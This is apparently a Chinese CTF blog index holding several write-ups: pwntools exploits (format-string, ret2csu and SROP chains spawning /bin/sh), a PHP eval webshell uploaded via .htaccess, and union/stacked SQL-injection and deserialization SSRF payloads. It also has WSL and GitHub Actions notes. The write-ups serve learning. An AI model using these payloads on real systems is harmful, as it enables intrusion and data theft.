ret2dlresolve [原创]高级栈溢出之ret2dlresolve详解(x86\u0026x64)，附源码分析 （和上两篇博文差不多，但是_dl_runtime_resolve()的执行过程写得很清晰，给作者点个赞） ","date":"2021-09-02","objectID":"/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:3:0","series":null,"tags":["CTF","pwn","栈"],"title":"pwn初学者的进阶（二）：ret2dlresolve学习记录","uri":"/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#参考链接"},{"categories":["CTF"],"content":" 题目链接 checksec 结果 Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) IDA分析 IDAimage-20210828140628177 \" IDA 很明显，存在格式化字符串漏洞。通过x==4的判断就能够拿到shell，那应该就是利用格式化字符串覆盖指定地址内容。 格式化字符串漏洞类型的pwn，核心就在于确定格式化字符串的偏移。因为一般来说在调用printf(buf)的时候，栈布局是这样的，所以我们得通过gdb调试等手段来判断格式化字符串的起始地址的偏移。 .... low ----------------- ----------------- old ebp -----------------stack of printf() ret addr ---------------- --------- arg1: addr of fmt_str | ----------------- | offset | | addr----------------- --------- format string content ........ high----------------- .... 最常用的方法是输入aaaa/aaaaaaaa＋%p.%p.....，通过看0x61在哪开始出现来判断偏移。 当然，在调试的时候也能够通过计算得出偏移，如本题的偏移就为(0x9c-0x70)/4=11（因为是32位，字长位4字节）。 再结合IDA查找变量x的地址，就可以写exp了。 from pwn import * context.os = \"linux\" context.arch = \"i386\" # context.log_level = \"debug\" if args.LOCAL: p = process(\"./fm\") else: p = remote(\"node4.buuoj.cn\", 28965) x_addr = 0x804a02c format_str_offset = 11 payload = p32(x_addr)+b'%11$n' p.sendline(payload) p.interactive() ","date":"2021-08-27","objectID":"/2021-08-27-buuctf-pwn-fmtstr/:0:0","series":null,"tags":["CTF","pwn","fmt_str"],"title":"pwn初学者的进阶（一）：格式化字符串","uri":"/2021-08-27-buuctf-pwn-fmtstr/#"},{"categories":["环境配置系列"],"content":"记录一下wsl迁移以及自选安装位置的一些操作。 打包 wsl --export distro_name file_name.tar 删除 wsl --unregister distro_name 导入（有看到博客说这里的distro_name需要与原本的disrto_name一致，不然会出问题，但我没试过。） wsl --import distro_name install_location file_name.tar 设置用户为原先的默认用户 ubuntu2004 config --default-user \u003cyour_user_name\u003e wsl手动安装即可自己选择安装位置，在官网下载相应的发行版，然后将.appx后缀名改为.zip，解压到自定义的目录，点击exe安装即可。 ","date":"2021-08-27","objectID":"/2021-08-27-wsl%E8%BF%81%E7%A7%BB%E7%AD%89%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/:0:0","series":null,"tags":["WSL"],"title":"Wsl迁移等操作记录","uri":"/2021-08-27-wsl%E8%BF%81%E7%A7%BB%E7%AD%89%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/#"},{"categories":["CTF"],"content":"0x00 前言 写这道题之前, 大家首先要了解, 想要获得一个shell, 除了system(\"/bin/sh\") 以外, 还有一种更好的方法, 就是系统调用中的 execve(\"/bin/sh\", NULL, NULL)获得shell。我们可以在 Linxu系统调用号表中找到对应的系统调用号,进行调用, 其中32位程序系统调用号用 eax 储存, 第一 、 二 、 三参数分别在 ebx 、ecx 、edx中储存， 可以用 int 80汇编指令调用。64位程序系统调用号用 rax 储存, 第一 、 二 、 三参数分别在 rdi 、rsi 、rdx中储存， 可以用syscall 汇编指令调用。 题目链接 这题我是我不会做的🤡，至少在看别人的博客之前是这样。而且，在查阅了众多资料以及自己跟着gdb调试之后，才终于弄懂了这题的一种解法。所以，为了加深理解，在这里记录一下假装是自己做出来的自己复现的解题过程吧。😅 ","date":"2021-08-26","objectID":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/:1:0","series":null,"tags":["CTF","pwn"],"title":"记录一道ret2csu的pwn题","uri":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/#0x00-前言"},{"categories":["CTF"],"content":"0x01 开始分析 首先checksec Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 64位，没开PIE，没有cannary，开了NX（说明不能直接写shellcode）。 IDA看一下，vuln()和gadgets()很显眼啊，看着这函数名当时心想这估计又是一道简简单单的基础rop训练，且看我10分钟拿下🤣那就分别去看一下这两个函数的内容吧。 首先是vuln()。发现其中调用了sys_read()和sys_write()，都是系统调用的形式。而且sys_read()向大小为0x10的buf写入最多0x400个数，这显然存在溢出。 vuln()函数image-20210827140902790 \" vuln()函数 然后是gadgets()。其中存在两个设置rax寄存器的gadget，查一下64位Linux系统调用表，0x0f是sigreturn，0x3b是execve。再结合vuln()中存在syscall语句，就可以确定最明显的思路了，那就是想办法调用execve(\"/bin/sh\", NULL, NULL)来获取shell。 gadgetsimage-20210827142815042 \" gadgets 根据前言提到的64位Linux系统调用的传参方式，我们在调用syscall之前需要完成两点： rax寄存器置为0x3b(59) rdi设为/bin/sh字符串的地址，rsi/rdx设为0 ","date":"2021-08-26","objectID":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/:2:0","series":null,"tags":["CTF","pwn"],"title":"记录一道ret2csu的pwn题","uri":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/#0x01-开始分析"},{"categories":["CTF"],"content":"0x02 execve/ret2csu解法 首先要想一下怎么获取指向字符串/bin/sh的地址。IDA view-\u003eopen subviews-\u003estrings查看，发现没有/bin/sh。所以只能调sys_read()自己写了。同时，注意到**vuln()函数的结尾是没有leave指令的**，所以vlun()被调用完之后其函数栈并没有被清空，于是我们可以写/bin/sh在栈上，而且覆盖的时候覆盖的rbp就直接是返回地址。 那么第二个问题来了，如何知道vuln()函数栈的地址呢，答案就是利用vuln()中的sys_write()调用。该调用输出0x30个字节的内容，在调试的过程中可以看到，buf在栈上的地址为0xdf30，而从源码可知它与rbp的距离为0x10个字节，所以sys_write()输出的第0x21~0x28个字节是可执行文件名的地址，输出内容与buf地址的偏移为0xe048-0xdf30=0x118=280。所以，我们可以通过泄露可执行文件名地址的方式来获取buf的地址。 需要注意的是，题目说明了该题的远程环境为Ubuntu18，而我一开始是用Ubuntu20调试的，所以得到的偏移为0x128，多了0x10个字节，我说怎么一直不对，后来再装了个ubuntu18的wsl，发现果然如此，估计是系统的地址对齐之类的原因。有趣的是，在这一过程中还学习了一些wsl的新操作，也算是需求导向性学习了，记录在了这里。 wsl-ubuntu18image-20210827112504437 \" wsl-ubuntu18 Ubuntu20上面看到的就是0xdf58-0xde30=0x128=296。 wsl-ubuntu20image-20210827112608649 \" wsl-ubuntu20 OK，地址知道了，execve()的3个参数的值我们都能够确定了，所以第一步就是泄露’buf’的地址。 payload1 = b'a'*0x10 + p64(vuln_addr) io.sendline(payload1) io.recv(0x20) stack_addr = u64(io.recv(8)) binsh_addr = stack_addr - 0x118 上面的payload1发完之后，又进入了vuln()。接下来的就是通过第二个payload想办法构造ROP链来实现控制寄存器与函数跳转的过程，这又是这题的一个难点（因为我做这题之前不知道ret2csu😶）。最简单的思路那肯定是用ROPgadget找到能够pop三个寄存器、然后ret的gadget。但是ROPgadget只能找到pop rdi和pop rsi的gadget（为什么pop rsi; pop r15; ret这条指令从中间开始取就是pop rdi; ret？这是指令设计的原因吗？），还差一个，所以这种方法行不通。 'pop rdx' 找不到image-20210827152113322 \" 'pop rdx' 找不到 因此，我们得用一种新的ret方式，ret2csu，就是利用_libc_csu_init()的pop和mov两个gadget来实现控制寄存器的操作，一般适用于64位的题目。ret2csu的参考资料网上都有，感觉这篇写的挺清晰的。 两段gadget为 //mov .text:0000000000400580 loc_400580: ; CODE XREF: __libc_csu_init+54↓j .text:0000000000400580 mov rdx, r13 .text:0000000000400583 mov rsi, r14 .text:0000000000400586 mov edi, r15d .text:0000000000400589 call ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8] .text:000000000040058D add rbx, 1 .text:0000000000400591 cmp rbx, rbp .text:0000000000400594 jnz short loc_400580 //pop .text:000000000040059A pop rbx .text:000000000040059B pop rbp .text:000000000040059C pop r12 .text:000000000040059E pop r13 .text:00000000004005A0 pop r14 .text:00000000004005A2 pop r15 .text:00000000004005A4 retn 总结下来就是： r15d -\u003e edi （一般来说rdi寄存器高8位都是0，所以这里虽然只控制了低8位，但实际上相当于可以控制rdi的值） r14 -\u003e rsi r13 -\u003e rdx 还有，rbx设为0，然后call [r12+rbx*8];就会以r12存储的地址为起点取指令，并且每次向后跳8位，因为call指令后会将rbx加1，然后对比rbp，如果不相等则再次循环 于是，理论上，我们就能够构造一段极其巧妙的payload2： payload2 = b'/bin/sh\\x00'.ljust(0x10, b'a') + p64(pop_rbx_rbp_r12_r13_r14_r15_ret) payload2 += p64(0)*2 + p64(binsh_addr+0x50) + p64(0)*3 payload2 += p64(mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12) + p64(mov_rax_59_ret) payload2 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(syscall) 对应的执行流程为： 写完’/bin/sh’，vuln()内执行retn，进而执行pop_rbx_rbp_r12_r13_r14_r15_ret。pop6次，rbx/rbp/r12/r13/r14/r15分别被设为0/0/binsh_addr+0x50/0/0/0/，rsp此时指向mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12，接在再retn，执行mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12，此时rsp指向mov_rax_59_ret，注意，这刚好是前面的binsh_addr_0x50😬 mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12指令执行，rsi/rdx被设置为0，第一次call [r12];。 众所周知，call指令的执行过程是先push再jump，然后jump的目的指令段最后一般都有个ret回来。所以，第一次执行call [r12];，就相当于执行mov_rax_59_ret，把rax设为了59，然后ret。经过一番push/ret之后，rsp又回到了mov_rax_59_ret的位置，但此时rbx已经被加了1，值变为了1。然后通过后面的cmp判断，jnz再次跳回mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12指令开头。 再次执行mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12，不同的是，此时rbx为1，所以call指令变为了call [r12+8];，所以pop_rdi_ret被执行：call首先push，rsp指向call之后的下一条指令，然后jump；jump之后pop rdi，rdi变为了call的下一条指令地址，rsp指向mov_rax_59_ret；再接着ret，rsp指向pop_rdi_ret，rip指令寄存器的内容为mov_rax_59_ret，所以系统执行的下一条指令为mov_rax_59_ret。 执行mov_rax_59_ret，rsp指向binsh_addr，rip指令寄存器的内容为pop_rdi_ret，所以系统执行的下一条指令为pop_rdi_ret。 pop rdi;将binsh_addr写入rdi，然后ret执行syscall。此时，rax为59，且三个寄存器rdi/rsi/rdx分别为binsh_addr/0/0，相当于执行execve(\"/bin/sh\", NULL, NULL)，拿到shell。 感觉这篇博客里的执行流程分析好像写错了一步… 最终完整exp如下。 from pwn import * ； # 本地调试 if args.LOCAL: # context.terminal = [\"wsl\", \"-c\"] # io = process(\"./ciscn_s_3\") io = gdb.debug(\"./ciscn_s_3\") else: io = remote(\"node4.buuoj.cn\", 25280) # context.log_level = 'debug' vuln_addr = 0x4004ed syscall = 0x400517 pop_rdi_ret = 0x4005a3 mov_rax_59_ret = 0x4004e2 pop_rbx_rbp_r12_r13_r14_r15_ret = 0x40059a mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r","date":"2021-08-26","objectID":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/:3:0","series":null,"tags":["CTF","pwn"],"title":"记录一道ret2csu的pwn题","uri":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/#0x02-execveret2csu解法"},{"categories":["CTF"],"content":"0x03 sigreturn/SROP解法 贴一下别人的exp，等我学习一下SROP再回过头来看。 from pwn import * context.arch = 'amd64' p =remote('node3.buuoj.cn',26063)# process('./ciscn_s_3') # e = ELF('./ciscn_s_3') mov_rax_15_ret = 0x4004da vuln_addr = 0x4004ed syscall_addr = 0x400517 payload1 = b'A' * 0x10 + p64(vuln_addr) p.sendline(payload1) p.recv(0x20) stack_leak = u64(p.recv(8)) - 0x118 log.info(\"stack addr: \" + hex(stack_leak)) frame = SigreturnFrame() frame.rax = 0x3b # syscall::execve, constants.SYS_execve is also ok frame.rip = syscall_addr frame.rdi = stack_leak frame.rsi = 0 frame.rdx = 0 payload2 = b'/bin/sh\\x00' + p64(0xdeadbeef) + p64(mov_rax_15_ret) + p64(syscall_addr) + bytes(frame) p.sendline(payload2) p.interactive() ","date":"2021-08-26","objectID":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/:4:0","series":null,"tags":["CTF","pwn"],"title":"记录一道ret2csu的pwn题","uri":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/#0x03-sigreturnsrop解法"},{"categories":["CTF"],"content":"0x04 总结 这题从不会，到看懂一种解法，以及查资料、gdb调试、尝试gdb+wsl2+pwntools联合调试、弄wsl ubuntu18、迁移占用c盘空间太多的wsl2-ubuntu20、写博客…，前前后后搞了差不多一天的时间🤣，一个字，疲惫=.= 不过总的来说，收获还是很多的，继续学吧 ","date":"2021-08-26","objectID":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/:5:0","series":null,"tags":["CTF","pwn"],"title":"记录一道ret2csu的pwn题","uri":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/#0x04-总结"},{"categories":["CTF"],"content":"参考链接 关于32位和64位Linux的系统调用 x64寄存器传参 Ciscn_2019_s_3 ","date":"2021-08-26","objectID":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/:5:1","series":null,"tags":["CTF","pwn"],"title":"记录一道ret2csu的pwn题","uri":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/#参考链接"},{"categories":["CTF"],"content":"已经到第4篇了，不容易啊 ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:0:0","series":null,"tags":["CTF","web"],"title":"BUUCTF Web记录 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#"},{"categories":["CTF"],"content":"0x00 [MRCTF2020]你传你🐎呢 题目链接 开头的日本人给我吓到了😅 笑川の笑容image-20210824192847310 \" 笑川の笑容 试了一下，php/php2/php3/phtml什么的都传不了，jpg可以传 那么思路就比较明显了，又是上传.htaccess或者.user.ini文件来使得服务端将图片🐎当作php文件解析。 上传.htaccess文件，文件内容： GIF89a \u003cFilesMatch \"leo.jpg\"\u003e SetHandler application/x-httpd-php \u003c/FilesMatch\u003e 这一步需要用Burp拦截请求，手动修改Content-Type: application/octet-stream为Content-Type: image/png。 然后上传leo.jpg，其中写入 GIF89a \u003cscript language='php'\u003e@eval($_POST['ye']);\u003c/script\u003e 蚁剑连接即可。 ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:1:0","series":null,"tags":["CTF","web"],"title":"BUUCTF Web记录 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#0x00-mrctf2020你传你呢"},{"categories":["CTF"],"content":"0x01 [MRCTF2020]Ez_bypass 题目链接 这题就这？ 根据提示看php源码 I put something in F12 for you include 'flag.php'; $flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}'; if(isset($_GET['gg'])\u0026\u0026isset($_GET['id'])) { $id=$_GET['id']; $gg=$_GET['gg']; if (md5($id) === md5($gg) \u0026\u0026 $id !== $gg) { echo 'You got the first step'; if(isset($_POST['passwd'])) { $passwd=$_POST['passwd']; if (!is_numeric($passwd)) { if($passwd==1234567) { echo 'Good Job!'; highlight_file('flag.php'); die('By Retr_0'); } else { echo \"can you think twice??\"; } } else{ echo 'You can not get it !'; } } else{ die('only one way to get the flag'); } } else { echo \"You are not a real hacker!\"; } } else{ die('Please input first'); } }Please input first 存在两层需要绕过 第一层，满足两个get请求参数的md5强相等但是参数不相等，这显然是传数组呀。需要记住的是，对于php后端，get请求传递数组的方式为/?a[]=1，这样相当于传递了a = [1]，/?a[]=1\u0026a[]=2则相当于传递了a = [1, 2]。 md5绕过image-20210825105000448 \" md5绕过 第二层要求post的参数经is_numeric()返回false，但是要能够满足==1234567。百度一下is_numeric()绕过即可，最简单的方式就是post一个字符串1234567 ，注意后面加了个空格。1234567%00同样可以满足要求。 is_numeric绕过image-20210825105341819 \" is_numeric绕过 ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:2:0","series":null,"tags":["CTF","web"],"title":"BUUCTF Web记录 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#0x01-mrctf2020ez_bypass"},{"categories":["CTF"],"content":"参考链接 [CTF]php is_numeric绕过 ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:2:1","series":null,"tags":["CTF","web"],"title":"BUUCTF Web记录 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#参考链接"},{"categories":["CTF"],"content":"0x02 [网鼎杯 2018]Fakebook 题目链接 fakebook，自己提交信息然后点join，就可以在网站上看到，这题应该是xss好吧并不是。 试了一下，用户名可以xss。 joinimage-20210825111401320 \" join 注册之后提交，发现浏览方式为请求/view.php?no=1，看一下能不能注入（不能只认为输入框才存在注入）。 union select被过滤了，可以用union/**/select绕过。尝试之后发现查询语句的结果有4列。同时为了得到回显信息，我们需要把no=1改为no=-1，使它自己本身的查询语句没有结果，这样才能让网页显示注入内容的回显。 /view.php?no=-1 union/**/select 1,database(),3,4#得到数据库名为fakebook /view.php?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=\"fakebook\"#得到fakebook库中有个表为users /view.php?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=\"users\"#得到表users的列为no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS 接下来不知道该干嘛了。web题不知道干嘛的话就先扫一下目录吧。 dirsearch扫出来源码备份user.php.bak文件（我至今仍然不知道为什么我用这东西一般都扫不出来什么有价值的结果）。里面定义了一个UserInfo类型，应该就是我们join时输入的内容。其中isValidBlog()会对blog字段过滤，getBlogContents()会请求博客内容并显示。看到这里就应该有点感觉了，这题的预期解应该是绕过blog字段的判断，然后ssrf读取服务端的flag。 \u003c?php class UserInfo { public $name = \"\"; public $age = 0; public $blog = \"\"; public function __construct($name, $age, $blog) { $this-\u003ename = $name; $this-\u003eage = (int)$age; $this-\u003eblog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-\u003eget($this-\u003eblog); } public function isValidBlog () { $blog = $this-\u003eblog; return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog); } } 再配合输入/view.php?no=-1 union/**/select 1,group_concat(data),3,4 from users#，会得到 O:8:\"UserInfo\":3:{s:4:\"name\";s:4:\"test\";s:3:\"age\";i:14;s:4:\"blog\";s:9:\"dtest.com\";},O:8:\"UserInfo\":3:{s:4:\"name\";s:3:\"leo\";s:3:\"age\";i:22;s:4:\"blog\";s:15:\"1iu2y.github.io\";},O:8:\"UserInfo\":3:{s:4:\"name\";s:40:\"tes2\";s:3:\"age\";i:14;s:4:\"blog\";s:9:\"fwfwf.com\";} 这刚好就是UserInfo的序列化结果。所以可以猜到view.php的逻辑就是根据no查询，再将查询结果的data栏进行反序列化，得到blog内容，然后调用getblogcontents()。所以我们通过修改反序列化的输入，就能够绕过isValidBlog()的判断。 而我们之前得到的列名结果为no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS，data在第四列，所以构造的反序列化字符串应该放在select的第四个位置。再结合php伪协议file://，以及/flag.php的请求结果为200（理论上来说这一点在扫描的时候就能够得知），可以构造以下payload： /view.php?no=-1 union/**/select 1,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:1:\"a\";s:3:\"age\";i:10;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}'# 查看源码得到base64编码。 base64image-20210825140012191 \" base64 解码得到flag \u003c?php $flag = \"flag{340198f3-c539-4aac-8a0c-5c6759155623}\"; exit(0); ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:3:0","series":null,"tags":["CTF","web"],"title":"BUUCTF Web记录 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#0x02-网鼎杯-2018fakebook"},{"categories":["CTF"],"content":"总结 这题结合了get请求注入、目录扫描、反序列化、php伪协议多个要素，是一道很有意思的题，也是目前为止我刷buuoj过程中碰到的最难的web题。 ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:3:1","series":null,"tags":["CTF","web"],"title":"BUUCTF Web记录 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#总结"},{"categories":["CTF"],"content":"0x03 [GYCTF2020]Blacklist 题目链接 1' or 1=1#看到当前表中存了3条记录。 array(2) { [0]=\u003e string(1) \"1\" [1]=\u003e string(7) \"hahahah\" } array(2) { [0]=\u003e string(1) \"2\" [1]=\u003e string(12) \"miaomiaomiao\" } array(2) { [0]=\u003e string(6) \"114514\" [1]=\u003e string(2) \"ys\" } 1' union select 1,2,3 #发现set/select等不论大小写都被过滤了。 return preg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject); 这又难到了我，看了一下报错注入也需要select啊，怎么操作呢？查阅博客后回想起，注入不是只有union联合注入、updataxml报错注入等，还有堆叠注入啊。 1';show tables;#查看所有表 array(2) { [0]=\u003e string(1) \"1\" [1]=\u003e string(7) \"hahahah\" } ------------------------ array(1) { [0]=\u003e string(8) \"FlagHere\" } array(1) { [0]=\u003e string(5) \"words\" } ------------------------ 1';desc FalgHere;#查看FlagHere表的结构 array(2) { [0]=\u003e string(1) \"1\" [1]=\u003e string(7) \"hahahah\" } ------------------------ array(6) { [0]=\u003e string(4) \"flag\" [1]=\u003e string(12) \"varchar(100)\" [2]=\u003e string(2) \"NO\" [3]=\u003e string(0) \"\" [4]=\u003e NULL [5]=\u003e string(0) \"\" } ------------------------ flag就在这里了。接下来可以用prepare设置计划任务，也可以rename更改表名，但是这些关键字都被过滤了。所以这里需使用handler来实现注入。😶 在堆叠注入中，可以利用handler直接列出需要查询内容的表的数据，只需要知道表名 https://blog.csdn.net/mochu7777777/article/details/109577534 1';handler FlagHere open;handler FlagHere read first;#即可 array(2) { [0]=\u003e string(1) \"1\" [1]=\u003e string(7) \"hahahah\" } ------------------------ array(1) { [0]=\u003e string(42) \"flag{eb3f6fba-9f4e-402a-9252-c258ce1fe7cb}\" } ------------------------ ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:4:0","series":null,"tags":["CTF","web"],"title":"BUUCTF Web记录 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#0x03-gyctf2020blacklist"},{"categories":["CTF"],"content":"参考链接 i春秋2020新春公益赛 GYCTF有关SQL注入题复现 ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:4:1","series":null,"tags":["CTF","web"],"title":"BUUCTF Web记录 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#参考链接-1"},{"categories":["CTF"],"content":"0x04 [GXYCTF2019]BabyUpload 文件上传，过滤了后缀名包含ph的文件。那最直接的思路就是上传图片马，然后再上传.htaccess或者.user.ini控制服务端将图片作为php解析。 随便访问一个不存在的目录，可以看到服务端用的是apache。 ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:5:0","series":null,"tags":["CTF","web"],"title":"BUUCTF Web记录 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#0x04-gxyctf2019babyupload"},{"categories":["CTF"],"content":"Not Found The requested URL /test was not found on this server. Apache/2.4.10 (Debian) Server at 5d755b3b-244b-42ae-b90c-2c9b6a481f76.node4.buuoj.cn Port 80 所以我们尝试上传.htaccess \u003cFilesMatch \"leo.jpg\"\u003e SetHandler application/x-httpd-php \u003c/FilesMatch\u003e 直接上传当然是不行的啦，得拦截然后修改为Content-Type: image/jpeg。然后常规操作，上传图片马再连接即可。 这里比较搞的一点是，我尝试了Content-Type: image/jpg和Content-Type: image/png，发现都不行，还以为这题又是一种新的绕过方式。再看了别人博客之后才发现，原来就是个jpeg的问题… 最后，关于jpeg/jpg/png/bmp/gif这些常见的图片文件头部结构，可以上wikipedia查看。 ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:0:0","series":null,"tags":["CTF","web"],"title":"BUUCTF Web记录 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#not-found"},{"categories":["CTF"],"content":"0x05 [BUUCTF 2018]Online Tool php rce的题，这种类型的没学过啊，不会😣 搁置一下，做道Pwn换换脑子🌚去。 ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:1:0","series":null,"tags":["CTF","web"],"title":"BUUCTF Web记录 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#0x05-buuctf-2018online-tool"},{"categories":["Hugo"],"content":"众所周知，hugo的github page部署有两种方式，分别是手动部署与github actions部署。 手动部署就是手动将生成的public文件夹中的静态网页内容推送到远程GitHub page仓库，但是比较繁琐，而且源码文件夹本身就是一个git仓库，嵌套的git仓库操作非常麻烦，容易出一些奇奇怪怪的问题。 所以，自动化的github actions就显得非常高效简洁了。 信息 我们从一个现有的hugo项目开始。 ","date":"2021-08-05","objectID":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/:0:0","series":null,"tags":["github","github actions"],"title":"Github Actions 设置记录","uri":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/#"},{"categories":["Hugo"],"content":"建立远程仓库 git init初始化 git remote add ...添加远程仓库 ","date":"2021-08-05","objectID":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/:0:1","series":null,"tags":["github","github actions"],"title":"Github Actions 设置记录","uri":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/#建立远程仓库"},{"categories":["Hugo"],"content":"生成personal_token 找到个人资料的Settings-\u003eDevelop settings-\u003ePersonal access tokens，点击Generate new token生成personal token。勾选如下内容，并且注意到默认的token有效期是30天，这也不用去修改为永不过期，因为永久的token是非常危险的。 personal token创建image-20210805135512950 \" personal token创建 将该token的内容复制下来，然后添加到github上源码仓库的secrets之中。 secret添加image-20210805140343530 \" secret添加 记得过期之后再去创建一个，然后修改secret的内容。 ","date":"2021-08-05","objectID":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/:0:2","series":null,"tags":["github","github actions"],"title":"Github Actions 设置记录","uri":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/#生成personal_token"},{"categories":["Hugo"],"content":"添加github action 添加.github/workflows/xxx.yml文件，创建github action。 name:github pageson:push:branches:- master # Set a branch to deploypull_request:jobs:deploy:runs-on:ubuntu-20.04steps:- uses:actions/checkout@v2with:submodules:true# Fetch Hugo themes (true OR recursive)fetch-depth:0# Fetch all history for .GitInfo and .Lastmod- name:Setup Hugouses:peaceiris/actions-hugo@v2with:hugo-version:'latest'# extended: true- name:Buildrun:hugo -D- name:Deployuses:peaceiris/actions-gh-pages@v3with:personal_token:${{ secrets.ACTIONS_ACCESS_TOKEN }}# 这里的 ACTIONS_DEPLOY_KEY 则是上面设置 Private Key的变量名external_repository:1iu2y/1iu2y.github.io# Pages 远程仓库 publish_dir:\"./public\"keep_files:false# remove existing filespublish_branch:master # deploying branch，对应于1iu2y.github.io仓库的branch，该仓库的默认分支是master，所以我这里也定义为了mastercommit_message:${{ github.event.head_commit.message }}#commit_message: ${{ github.event.head_commit.message }} ","date":"2021-08-05","objectID":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/:0:3","series":null,"tags":["github","github actions"],"title":"Github Actions 设置记录","uri":"/2021-08-05-github-actions-%E8%AE%BE%E7%BD%AE%E8%AE%B0%E5%BD%95/#添加github-action"},{"categories":["Hugo"],"content":"It works! action成功执行image-20210805143049479 \" action成功执行 另一个仓库被成功修改image-20210805143127899 \" 另一个仓库被成功修改 技巧 